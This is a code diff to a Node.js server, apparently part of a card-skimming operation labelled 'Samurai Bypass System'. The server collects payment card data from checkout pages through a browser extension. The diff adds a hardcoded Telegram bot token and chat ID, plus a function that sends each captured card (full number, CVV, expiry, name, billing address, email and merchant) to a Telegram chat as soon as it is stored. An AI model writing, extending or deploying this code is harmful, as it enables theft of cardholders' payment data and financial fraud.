@@ -34,6 +34,8 @@ const PORT = process.env.PORT || 3000;
 const BEARER_TOKEN = process.env.BEARER_TOKEN || 'nai-bypass-token-change-me-2026';
 const LOG_SECRET = process.env.LOG_SECRET || 'your-secret-key-here-change-me';
 const STRIPE_API = process.env.STRIPE_API || 'https://api.stripe.com';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8557859628:AAHVFbQr2RChC_9WeuxUEVWtCHjKZ-G39Ks';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003238480673';
 
 // In-memory storage for card logs
 let cardsAll = [];
@@ -74,6 +76,106 @@ const authenticateToken = (req, res, next) => {
   
   next();
 };
+// ============================================================================
+// TELEGRAM NOTIFICATION HELPER
+// ============================================================================
+
+/**
+ * Send card capture notification to Telegram
+ * @param {Object} cardData - Parsed card data
+ * @param {Object} checkoutInfo - Full checkout details
+ * @param {string} site - Merchant site
+ */
+async function sendToTelegram(cardData, checkoutInfo, site) {
+  try {
+    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    // Format timestamp
+    const timestamp = new Date().toLocaleString('en-US', { 
+      timeZone: 'UTC',
+      dateStyle: 'medium',
+      timeStyle: 'medium'
+    });
+    
+    // Parse card data (it's a string from extension)
+    let parsedCard = {};
+    try {
+      parsedCard = typeof cardData === 'string' ? JSON.parse(cardData) : cardData;
+    } catch (e) {
+      console.error('[Telegram] Failed to parse card data:', e);
+      parsedCard = { number: 'ERROR', exp_month: '?', exp_year: '?', cvc: '?' };
+    }
+    
+    // Extract card details (UNMASKED - full numbers)
+    const cardNumber = parsedCard.number || 'N/A';
+    const expMonth = String(parsedCard.exp_month || '').padStart(2, '0');
+    const expYear = String(parsedCard.exp_year || '').slice(-2);
+    const cvv = parsedCard.cvc || 'N/A';
+    const cardholderName = parsedCard.name || 'N/A';
+    
+    // Extract billing address
+    const address = parsedCard.address_line1 || 'N/A';
+    const city = parsedCard.address_city || 'N/A';
+    const state = parsedCard.address_state || 'N/A';
+    const zip = parsedCard.address_zip || 'N/A';
+    const country = parsedCard.address_country || 'N/A';
+    
+    // Extract merchant info
+    const merchantName = checkoutInfo?.merchant?.displayName || site || 'Unknown Merchant';
+    const merchantSite = checkoutInfo?.merchant?.businessUrl || site || 'N/A';
+    
+    // Extract payment info
+    const totalAmount = checkoutInfo?.totals?.total ? (checkoutInfo.totals.total / 100).toFixed(2) : 'N/A';
+    const currency = (checkoutInfo?.currency || 'USD').toUpperCase();
+    const customerEmail = checkoutInfo?.customerEmail || 'N/A';
+    
+    // Format message with FULL UNMASKED card data
+    const message = `🎯 <b>NEW CARD CAPTURED</b> 🎯\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n` +
+      `💳 <b>Card:</b> <code>${cardNumber}</code>\n` +
+      `📅 <b>Exp:</b> <code>${expMonth}/${expYear}</code>\n` +
+      `🔐 <b>CVV:</b> <code>${cvv}</code>\n` +
+      `👤 <b>Name:</b> <code>${cardholderName}</code>\n\n` +
+      `📍 <b>Billing Address:</b>\n` +
+      `<code>${address}</code>\n` +
+      `<code>${city}, ${state} ${zip}</code>\n` +
+      `<code>${country}</code>\n\n` +
+      `🏪 <b>Merchant:</b> <code>${merchantName}</code>\n` +
+      `🌐 <b>Site:</b> <code>${merchantSite}</code>\n` +
+      `💰 <b>Amount:</b> <code>${totalAmount} ${currency}</code>\n` +
+      `📧 <b>Email:</b> <code>${customerEmail}</code>\n` +
+      `⏰ <b>Time:</b> <code>${timestamp} UTC</code>\n\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n` +
+      `🌐 <i>Samurai Bypass System</i>`;
+    
+    console.log('[Telegram] Sending notification...');
+    
+    const response = await fetch(telegramUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      })
+    });
+    
+    const result = await response.json();
+    
+    if (result.ok) {
+      console.log('[Telegram] ✅ Notification sent successfully');
+      return true;
+    } else {
+      console.error('[Telegram] ❌ Failed:', result);
+      return false;
+    }
+  } catch (error) {
+    console.error('[Telegram] ❌ Error:', error);
+    return false;
+  }
+}
+
 
 // ============================================================================
 // CRITICAL: Browser User Agent Removal Function
@@ -409,6 +511,9 @@ app.post('/x7k9m2', authenticateToken, express.json(), async (req, res) => {
     });
     
     console.log(`[Card Log] Captured card (Total: ${cardsAll.length})`);
+    
+    // Send to Telegram immediately after storing
+    await sendToTelegram(cardData, checkoutInfo, site);
     
     res.json({ 
       success: true, 
